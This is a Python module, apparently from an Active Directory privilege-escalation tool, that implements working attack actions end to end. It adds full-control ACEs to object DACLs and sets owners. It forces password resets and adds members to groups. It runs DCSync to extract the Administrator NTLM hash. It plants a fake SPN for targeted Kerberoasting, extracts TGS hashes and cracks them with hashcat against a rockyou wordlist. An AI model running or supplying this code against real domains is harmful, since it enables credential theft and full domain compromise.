"""Shared privesc actions for the module-based architecture."""

import binascii
import logging
import re
import subprocess
from datetime import datetime
from pathlib import Path

import ldap3
from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP
from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT
from impacket.krb5.types import Principal
from impacket.examples.secretsdump import NTDSHashes, RemoteOperations
from impacket.smbconnection import SMBConnection
from ldap3 import BASE, MODIFY_ADD, SUBTREE
from ldap3.protocol.microsoft import security_descriptor_control
from pyasn1.codec.der import decoder
from impacket.ldap import ldaptypes
from impacket.ldap.ldaptypes import ACCESS_ALLOWED_ACE, ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, ACE


class PrivescActions:
    def __init__(self, engine):
        self.engine = engine
        self.conn = engine.conn
        self.domain = engine.domain
        self.dc_ip = engine.dc_ip

    def _identity_variants(self, identity):
        """Return common AD identity aliases for the same principal."""
        if not identity:
            return []

        raw = str(identity).strip()
        variants = []
        seen = set()

        for candidate in [raw, raw.split("\\")[-1] if "\\" in raw else raw, raw.split("@")[0] if "@" in raw else raw]:
            if candidate and candidate not in seen:
                variants.append(candidate)
                seen.add(candidate)

        if "@" in raw:
            sam = raw.split("@")[0]
            if sam and sam not in seen:
                variants.append(sam)
                seen.add(sam)
        elif "\\" in raw:
            sam = raw.split("\\")[-1]
            if sam and sam not in seen:
                variants.append(sam)
                seen.add(sam)

        if self.domain:
            netbios = self.domain.split(".")[0]
            for candidate in [raw, variants[0] if variants else raw]:
                sam = candidate.split("\\")[-1] if "\\" in candidate else candidate.split("@")[0] if "@" in candidate else candidate
                for alias in [f"{netbios}\\{sam}", f"{sam}@{self.domain}", sam]:
                    if alias and alias not in seen:
                        variants.append(alias)
                        seen.add(alias)

        return variants

    def resolve_distinguished_name(self, identity):
        """Resolve a DN from UPN/name/sAMAccountName/cn when path data lacks DN."""
        if not identity:
            return None

        if isinstance(identity, str) and identity.upper().startswith("CN="):
            return identity

        domain_parts = [part for part in str(self.domain).split(".") if part]
        search_base = ",".join([f"DC={part}" for part in domain_parts])
        if not search_base:
            return None

        candidates = self._identity_variants(identity)
        for candidate in candidates:
            if not candidate:
                continue
            ldap_filter = (
                f"(|(distinguishedName={candidate})(userPrincipalName={candidate})"
                f"(sAMAccountName={candidate})(name={candidate})(cn={candidate}))"
            )
            try:
                if self.conn.search(
                    search_base=search_base,
                    search_filter=ldap_filter,
                    search_scope=SUBTREE,
                    attributes=["distinguishedName"],
                    size_limit=1,
                ) and self.conn.entries:
                    return str(self.conn.entries[0].entry_dn)
            except Exception as e:
                print(f"  [!] DN LOOKUP FAILED for {identity}: {e}")

        return None

    def get_edge_nodes(self, rel):
        """Return start/end node dicts, tolerating predictive list-style edges."""
        start_node = getattr(rel, "start_node", None) or {}
        end_node = getattr(rel, "end_node", None) or {}
        if not isinstance(start_node, dict):
            start_node = self._node_to_dict(start_node)
        if not isinstance(end_node, dict):
            end_node = self._node_to_dict(end_node)
        return start_node, end_node

    def get_object_sid(self, identity):
        """Resolve objectSid for a DN, UPN, or SAM-style identity."""
        if not identity:
            return None

        if isinstance(identity, str) and identity.upper().startswith("CN="):
            dn = identity
        else:
            dn = self.resolve_distinguished_name(identity)
            if not dn:
                for candidate in self._identity_variants(identity):
                    if not candidate:
                        continue
                    dn = self.resolve_distinguished_name(candidate)
                    if dn:
                        break

        if not dn:
            return None

        try:
            if self.conn.search(dn, "(objectClass=*)", search_scope=BASE, attributes=["objectSid"], size_limit=1) and self.conn.entries:
                sid_attr = self.conn.entries[0].entry_attributes_as_dict.get("objectSid")
                return sid_attr[0] if sid_attr else None
        except Exception as e:
            print(f"  [!] SID LOOKUP FAILED for {identity}: {e}")
        return None

    def load_security_descriptor(self, dn):
        """Read nTSecurityDescriptor for an object."""
        controls = security_descriptor_control(sdflags=0x07)
        if self.conn.search(dn, "(objectClass=*)", search_scope=BASE, attributes=["nTSecurityDescriptor"], controls=controls) and self.conn.entries:
            raw = self.conn.entries[0]["nTSecurityDescriptor"].raw_values[0]
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
            sd.fromString(raw)
            return sd
        return None

    def get_owner_sid(self, dn):
        """Return the current owner SID as a canonical string, if available."""
        sd = self.load_security_descriptor(dn)
        if not sd:
            return None
        try:
            owner = sd['OwnerSid']
        except Exception:
            return None
        if not owner:
            return None
        try:
            return owner.formatCanonical()
        except Exception:
            return str(owner)

    def is_member_of_group(self, group_dn, user_dn):
        """Check whether a user DN is already a member of a group."""
        if not group_dn or not user_dn:
            return False
        try:
            if not self.conn.search(group_dn, "(objectClass=*)", search_scope=BASE, attributes=["member"], size_limit=1) or not self.conn.entries:
                return False
            member_values = self.conn.entries[0].entry_attributes_as_dict.get("member", [])
            if not member_values:
                return False
            normalized_user = str(user_dn).lower()
            return any(str(member).lower() == normalized_user for member in member_values)
        except Exception as exc:
            logging.warning("is_member_of_group(%s, %s) failed: %s", group_dn, user_dn, exc)
            return False

    def save_security_descriptor(self, dn, sd):
        """Write nTSecurityDescriptor back to an object."""
        controls = security_descriptor_control(sdflags=0x07)
        self.conn.modify(dn, {"nTSecurityDescriptor": [(ldap3.MODIFY_REPLACE, [sd.getData()])]}, controls=controls)

    def grant_full_control(self, dn, sid):
        """Add a full-control ACE to an object's DACL."""
        sd = self.load_security_descriptor(dn)
        if not sd:
            return False

        ace = ACE()
        ace['AceType'] = ACCESS_ALLOWED_ACE.ACE_TYPE
        ace['AceFlags'] = 0x00
        ace_data = ACCESS_ALLOWED_ACE()
        ace_data['Mask'] = ACCESS_MASK()
        ace_data['Mask']['Mask'] = 983551
        ace_data['Sid'] = ldaptypes.LDAP_SID()
        ace_data['Sid'].fromCanonical(sid)
        ace['Ace'] = ace_data

        try:
            dacl = sd['Dacl']
        except Exception:
            dacl = None

        if dacl is None or dacl == b'':
            dacl = ldaptypes.ACL()
            dacl['AclRevision'] = 2
            dacl['Sbz1'] = 0
            dacl['Sbz2'] = 0
            dacl['Data'] = []
            sd['Dacl'] = dacl

        if not hasattr(sd['Dacl'], 'Data'):
            sd['Dacl']['Data'] = []

        sd['Dacl']['Data'].append(ace)
        self.save_security_descriptor(dn, sd)
        return True

    def grant_generic_all(self, dn, sid):
        """Grant a superset of GenericAll permissions by adding full control to the target DACL."""
        return self.grant_full_control(dn, sid)

    def grant_group_addmember(self, dn, sid):
        """Grant member-write capability to a group, implemented as a superset DACL full-control grant."""
        return self.grant_full_control(dn, sid)

    def set_owner(self, dn, sid):
        """Set the owner SID on an object's security descriptor."""
        sd = self.load_security_descriptor(dn)
        if not sd:
            return False

        sd['OwnerSid'] = ldaptypes.LDAP_SID()
        sd['OwnerSid'].fromCanonical(sid)
        self.save_security_descriptor(dn, sd)
        return True

    def resolve_target(self, rel):
        """Resolve the most useful target endpoint for a relationship."""
        start_node, end_node = self.get_edge_nodes(rel)
        for node in (end_node, start_node):
            target_dn = node.get("distinguishedname")
            target_name = node.get("name")
            if target_dn or target_name:
                return target_dn or self.resolve_distinguished_name(target_name), target_name
        return None, None

    @staticmethod
    def _node_to_dict(node):
        if isinstance(node, dict):
            return node

        result = {}
        if hasattr(node, "get"):
            result["name"] = node.get("name")
            result["distinguishedname"] = node.get("distinguishedname")
            return result

        try:
            result["name"] = node["name"]
        except Exception:
            result["name"] = None

        try:
            result["distinguishedname"] = node["distinguishedname"]
        except Exception:
            result["distinguishedname"] = None

        return result

    def _resolve_kerberos_username(self):
        """Return a Kerberos-friendly username from the current LDAP bind identity."""
        raw_user = str(self.conn.user or "")
        if not raw_user:
            return raw_user

        if "\\" in raw_user:
            return raw_user.split("\\")[-1]

        if "@" in raw_user:
            return raw_user.split("@")[0]

        if raw_user.upper().startswith("CN="):
            try:
                if self.conn.search(
                    search_base=raw_user,
                    search_filter="(objectClass=*)",
                    search_scope=BASE,
                    attributes=["sAMAccountName", "userPrincipalName"],
                    size_limit=1,
                ) and self.conn.entries:
                    entry = self.conn.entries[0]

                    sam_attr = getattr(entry, "sAMAccountName", None)
                    if sam_attr and sam_attr.value:
                        return str(sam_attr.value)

                    upn_attr = getattr(entry, "userPrincipalName", None)
                    if upn_attr and upn_attr.value:
                        return str(upn_attr.value).split("@")[0]
            except Exception as e:
                print(f"  [!] USER RESOLUTION FAILED from DN bind: {e}")

        return raw_user

    def force_change_password(self, target_dn, new_password):
        print(f"[*] Exploiting ForceChangePassword on {target_dn}...")
        try:
            result = self.conn.extend.microsoft.modify_password(target_dn, new_password)
            if result:
                print(f"[+] Password successfully changed to: {new_password}")
            else:
                # Provide LDAP diagnostic info when available
                try:
                    diag = getattr(self.conn, 'result', {})
                    print(f"  [!] LDAP RESULT: {diag}")
                except Exception:
                    pass
            return result
        except Exception as exc:
            print(f"  [!] ForceChangePassword call failed: {exc}")
            try:
                diag = getattr(self.conn, 'result', {})
                print(f"  [!] LDAP RESULT: {diag}")
            except Exception:
                pass
            return False

    def add_group_member(self, group_dn, user_dn):
        # user_dn may be a distinguishedName or a sam/UPN; resolve to DN if needed
        try:
            resolved_user_dn = user_dn
            if not isinstance(user_dn, str) or not user_dn.upper().startswith("CN="):
                # attempt to resolve by name
                resolved = self.resolve_distinguished_name(user_dn)
                if resolved:
                    resolved_user_dn = resolved

            display_user = user_dn
            try:
                if isinstance(user_dn, str) and "@" in user_dn:
                    display_user = user_dn
                elif isinstance(resolved_user_dn, str) and resolved_user_dn.upper().startswith("CN="):
                    # try to extract CN or name
                    m = re.match(r"CN=([^,]+)", resolved_user_dn, re.IGNORECASE)
                    if m:
                        display_user = m.group(1)
            except Exception:
                display_user = str(user_dn)

            print(f"  [*] Attempting to add member '{display_user}' -> {group_dn}...")
            print(f"  [*] Resolved user DN: {resolved_user_dn}")
            success = self.conn.modify(group_dn, {"member": [(MODIFY_ADD, [resolved_user_dn])]})
            # always print LDAP result for diagnostics
            try:
                print(f"  [*] LDAP modify result: {self.conn.result}")
            except Exception:
                pass

            if not success:
                result_code = self.conn.result.get("result")
                diagnostic = self.conn.result.get("message") or self.conn.result.get("description")
                if result_code == 68 or (diagnostic and "already a member" in str(diagnostic).lower()):
                    print(f"  [-] {display_user} is already a member of this group. Skipping safely.")
                    return True

                print(f"  [!] LDAP MODIFY_ADD failed (code={result_code}): {diagnostic}")
                return False

            print(f"  [+] Added {display_user} to {group_dn}")
            return True
        except Exception as e:
            print(f"  [!] Exception while adding member: {e}")
            try:
                print(f"  [!] LDAP RESULT: {getattr(self.conn, 'result', {})}")
            except Exception:
                pass
            return False

    def dcsync(self, current_password):
        """Perform DCSync as the current principal and recover Administrator's NTLM hash."""

        actor = self._resolve_kerberos_username()
        target = "Administrator"
        remote_ops = None

        try:
            smb = SMBConnection(
                self.dc_ip,
                self.dc_ip,
                sess_port=445
            )
            smb.login(
                actor,
                current_password,
                self.domain
            )

            remote_ops = RemoteOperations(
                smb,
                False,
                kdcHost=self.dc_ip
            )
            remote_ops.connectSamr(self.domain)

            raw_sid = self.get_object_sid(target)

            if not raw_sid:
                raise Exception(
                    f"Could not resolve SID for {target}"
                )

            sid_obj = ldaptypes.LDAP_SID()

            if isinstance(raw_sid, (bytes, bytearray)):
                sid_obj.fromString(raw_sid)
            else:
                sid_obj.fromCanonical(str(raw_sid))

            target_sid = sid_obj.formatCanonical()

            print("[*] Performing DCSync")

            user_record = remote_ops.DRSGetNCChangesSid(
                target_sid
            )

            reply_version = f"V{user_record['pdwOutVersion']}"
            reply = user_record['pmsgOut'][reply_version]

            if reply['cNumObjects'] <= 0:
                raise Exception(
                    "DCSync returned no objects"
                )

            print("[+] DCSync Request Successful")

            prefix_table = reply['PrefixTableSrc']['pPrefixEntry']
            recovered_hashes = []

            def hash_callback(secret_type, secret):
                if secret_type == NTDSHashes.SECRET_TYPE.NTDS:
                    recovered_hashes.append(str(secret))

            ntds = NTDSHashes(
                None,
                b'',
                isRemote=False,
                history=False,
                noLMHash=True,
                remoteOps=remote_ops,
                useVSSMethod=False,
                remoteSSMethodWMINTDS=False,
                justNTLM=True,
                pwdLastSet=False,
                resumeSession=None,
                outputFileName=None,
                justUser=None,
                skipUser=None,
                ldapFilter=None,
                printUserStatus=False,
                localDomainSid=None,
                perSecretCallback=hash_callback
            )

            try:
                ntds._NTDSHashes__decryptHash(
                    user_record,
                    prefix_table,
                    None
                )
            finally:
                try:
                    ntds.finish()
                except Exception:
                    pass

            administrator_hash = None

            for recovered in recovered_hashes:
                parts = recovered.split(":")

                if len(parts) >= 4:
                    username = parts[0].lower()
                    rid = parts[1]

                    if username == "administrator" or rid == "500":
                        administrator_hash = parts[3]
                        break

            if not administrator_hash:
                raise Exception(
                    "Administrator NTLM hash was not recovered"
                )

            print(
                f"[+] Administrator NTLM Hash: "
                f"{administrator_hash}"
            )

            return True

        except Exception as e:
            print(f"[!] DCSync Failed: {e}")
            return False

        finally:
            if remote_ops is not None:
                try:
                    remote_ops.finish()
                except Exception:
                    pass

    def set_fake_spn(self, target_dn, spn_value="viper/roasted"):
        print(f"  [*] Attempting LDAP MODIFY_ADD for servicePrincipalName...")
        success = self.conn.modify(target_dn, {"servicePrincipalName": [(MODIFY_ADD, [spn_value])]})

        if not success:
            result_code = self.conn.result["result"]
            diagnostic = self.conn.result.get("message", "")

            if result_code == 68 or "1006" in diagnostic:
                print(f"  [-] SPN value '{spn_value}' already exists on target. Skipping safely.")
                return True

            print("  [!] SPN SET FAILED")
            print(f"  [!] LDAP ERROR: {self.conn.result.get('description', 'Unknown')}")
            print(f"  [!] DIAGNOSTIC: {diagnostic or 'No detail provided'}")

        return success

    def request_kerberoast_hash(self, target_user_name, spn, current_password):
        print(f"  [*] INITIATING: Remote TGS-REQ for SPN {spn}")

        try:
            target_principal = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
            user = self._resolve_kerberos_username()

            client_principal = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            tgt, cipher, old_session_key, session_key = getKerberosTGT(
                client_principal,
                str(current_password),
                str(self.domain),
                "",
                "",
                kdcHost=str(self.dc_ip),
            )

            tgs, cipher, old_session_key, session_key = getKerberosTGS(
                target_principal,
                str(self.domain),
                str(self.dc_ip),
                tgt,
                cipher,
                session_key,
            )

            etype = 23
            blob = None

            if isinstance(tgs, (bytes, bytearray)):
                decoded_tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
                etype = int(decoded_tgs["ticket"]["enc-part"]["etype"])
                blob = decoded_tgs["ticket"]["enc-part"]["cipher"].asOctets()
            else:
                etype = int(tgs["ticket"]["enc-part"]["etype"])
                cipher_field = tgs["ticket"]["enc-part"]["cipher"]
                blob = cipher_field.asOctets() if hasattr(cipher_field, "asOctets") else bytes(cipher_field)

            if etype == 23 and len(blob) >= 16:
                checksum = binascii.hexlify(blob[:16]).decode()
                encrypted = binascii.hexlify(blob[16:]).decode()
                real_hash = f"$krb5tgs$23$*{target_user_name}${self.domain}${spn}*${checksum}${encrypted}"
            else:
                real_hash = f"$krb5tgs${etype}$*{target_user_name}*{self.domain}*{spn}*{binascii.hexlify(blob).decode()}"

            print(f"  [+] HASH EXTRACTED: {real_hash[:60]}...")
            return real_hash

        except Exception as e:
            print(f"  [!] KERBEROAST FAILED: {str(e)}")
            return False

    def persist_hash_and_maybe_crack(self, hash_value, target_user_name, spn_value):
        """Optionally persist the hash to a .kirbi file and run hashcat."""
        if not hash_value:
            return False

        # Keep the existing text log for tracking.
        text_log = Path.cwd() / "data" / "extracted_hashes.txt"
        text_log.parent.mkdir(parents=True, exist_ok=True)
        timestamp = datetime.utcnow().isoformat(timespec="seconds") + "Z"
        with text_log.open("a", encoding="utf-8") as fh:
            fh.write(f"{timestamp} | target={target_user_name} | spn={spn_value} | {hash_value}\n")

        answer = input("Attempt to crack extracted hash with hashcat? [y/N]: ").strip().lower()
        if answer not in {"y", "yes"}:
            logging.info("Hash cracking skipped by user.")
            return True

        safe_name = re.sub(r"[^A-Za-z0-9._-]+", "_", str(target_user_name).split("@")[0].lower())
        kirbi_path = Path.cwd() / "data" / f"{safe_name}.kirbi"
        kirbi_path.write_text(f"{hash_value}\n", encoding="utf-8")
        logging.info(f"Saved hash to {kirbi_path}")

        hashcat_cmd = ["hashcat", "-m", "13100", str(kirbi_path), "/usr/share/wordlists/rockyou.txt"]
        logging.info("Running: %s", " ".join(hashcat_cmd))

        try:
            completed = subprocess.run(hashcat_cmd, check=False)
            if completed.returncode != 0:
                logging.warning(f"hashcat exited with code {completed.returncode}")
        except FileNotFoundError:
            logging.error("hashcat not found in PATH.")
        except Exception as exc:
            logging.error(f"hashcat execution failed: {exc}")

        return True
